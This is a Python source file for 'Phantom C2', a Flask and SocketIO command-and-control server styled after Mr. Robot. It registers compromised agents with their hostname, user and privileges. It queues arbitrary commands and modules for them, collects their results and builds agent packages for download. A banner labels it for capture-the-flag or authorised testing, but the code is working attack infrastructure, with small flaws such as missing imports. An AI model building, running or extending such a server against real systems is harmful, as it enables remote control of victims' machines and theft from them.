"""
Phantom C2 Server — Mr. Robot styled Command & Control.
Backend core: Flask + Flask-SocketIO.
"""
from flask import Flask
from flask_socketio import SocketIO
import os, json, time, uuid, threading
from datetime import datetime

from persistence import Persistence
from agent_manager import AgentManager
from module_loader import ModuleLoader
from build_agent import build_agent_zip

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

DB_PATH = os.environ.get('PHANTOM_DB', 'phantom.db')
persist = Persistence(DB_PATH)
agent_mgr = AgentManager(persist, socketio)
module_loader = ModuleLoader(persist)

# ---------- routes ----------
@app.route('/')
def index():
    return app.send_static_file('terminal.html')

@app.route('/api/register', methods=['POST'])
def register_agent():
    data = request.json or {}
    aid = data.get('id') or str(uuid.uuid4())[:12]
    info = {
        'hostname': data.get('hostname', 'unknown'),
        'username': data.get('username', 'unknown'),
        'os': data.get('os', 'unknown'),
        'arch': data.get('arch', 'unknown'),
        'privileges': data.get('privileges', 'user'),
        'ip': request.remote_addr,
        'last_seen': time.time(),
        'connected': True,
        'status': 'active'
    }
    agent_mgr.register(aid, info)
    return jsonify({'id': aid})

@app.route('/api/agent/<aid>/poll')
def poll_commands(aid):
    if aid not in agent_mgr.agents:
        return jsonify({'error': 'not found'}), 404
    agent = agent_mgr.agents[aid]
    agent['last_seen'] = time.time()
    pending = agent_mgr.pending_commands(aid)
    return jsonify({'commands': pending})

@app.route('/api/agent/<aid>/result/<cid>', methods=['POST'])
def post_result(aid, cid):
    data = request.json or {}
    data.setdefault('received_at', time.time())
    persist.save_result(aid, cid, data)
    agent_mgr.complete_command(aid, cid)
    socketio.emit('command_result', {'cid': cid, 'aid': aid, 'result': data})
    socketio.emit('event', {
        'ts': datetime.now().strftime('%H:%M:%S'),
        'type': 'result',
        'aid': aid,
        'cid': cid,
        'text': f"Result from {aid}: {data.get('type','unknown')}"
    })
    return jsonify({'ok': True})

@app.route('/api/agents')
def list_agents():
    return jsonify(agent_mgr.list_agents())

@app.route('/api/agents/<aid>')
def get_agent(aid):
    if aid not in agent_mgr.agents:
        return jsonify({'error': 'not found'}), 404
    return jsonify(agent_mgr.get_agent(aid))

@app.route('/api/agent/<aid>/command', methods=['POST'])
def issue_command(aid):
    if aid not in agent_mgr.agents:
        return jsonify({'error': 'not found'}), 404
    data = request.json or {}
    cid = str(uuid.uuid4())[:12]
    cmd = {'cmd': data.get('cmd'), 'args': data.get('args', []), 'module': data.get('module')}
    persist.save_command(aid, cid, cmd)
    agent_mgr.issue_command(aid, cid, cmd)
    socketio.emit('new_command', {'aid': aid, 'cid': cid, 'cmd': cmd})
    socketio.emit('event', {
        'ts': datetime.now().strftime('%H:%M:%S'),
        'type': 'command',
        'aid': aid,
        'cid': cid,
        'text': f"Issued {cmd.get('cmd')} to {aid}"
    })
    return jsonify({'command_id': cid})

@app.route('/api/modules')
def list_modules():
    return jsonify(module_loader.list_modules())

@app.route('/api/agent/<aid>/module/<module_name>', methods=['POST'])
def execute_module(aid, module_name):
    if aid not in agent_mgr.agents:
        return jsonify({'error': 'not found'}), 404
    if module_name not in module_loader.modules:
        return jsonify({'error': 'module not found'}), 404
    cid = str(uuid.uuid4())[:12]
    data = request.json or {}
    cmd = {'cmd': 'module', 'args': [], 'module': module_name, 'data': data}
    persist.save_command(aid, cid, cmd)
    agent_mgr.issue_command(aid, cid, cmd)
    socketio.emit('new_command', {'aid': aid, 'cid': cid, 'module': module_name})
    socketio.emit('event', {
        'ts': datetime.now().strftime('%H:%M:%S'),
        'type': 'module',
        'aid': aid,
        'cid': cid,
        'text': f"Module {module_name} executed on {aid}"
    })
    return jsonify({'command_id': cid})

@app.route('/api/build/agent')
def build_agent():
    config = request.args.to_dict()
    buf, name = build_agent_zip(config)
    from flask import send_file
    return send_file(buf, mimetype='application/zip', as_attachment=True, download_name=name)

@app.route('/api/results/<aid>')
def get_results(aid):
    return jsonify(persist.get_results(aid))

from flask import request
@socketio.on('connect')
def on_connect():
    emit('connected', {'msg': 'Phantom C2 link established'})

if __name__ == '__main__':
    print("""
╔╗╔╗╔═╗╦═╗╔╦╗╦╔╗╔╦ ╦╔═╗╦═╗
║╚╝║║╣ ╠╦╝║║║║║║║║ ║╠═╝╠╦╝
╩╩╩╩╚═╝╩╚═╩ ╩╩╝╚╝╚═╝╩ ╩ ╩
""")
    print("[*] Phantom C2 — CTF / Authorized Testing Only")
    print("[*] Dashboard : http://0.0.0.0:8080")
    print("[*] API       : http://0.0.0.0:8080/api")
    print("[*] WebSocket : enabled\n")
    socketio.run(app, host='0.0.0.0', port=8080, debug=False, use_reloader=False)
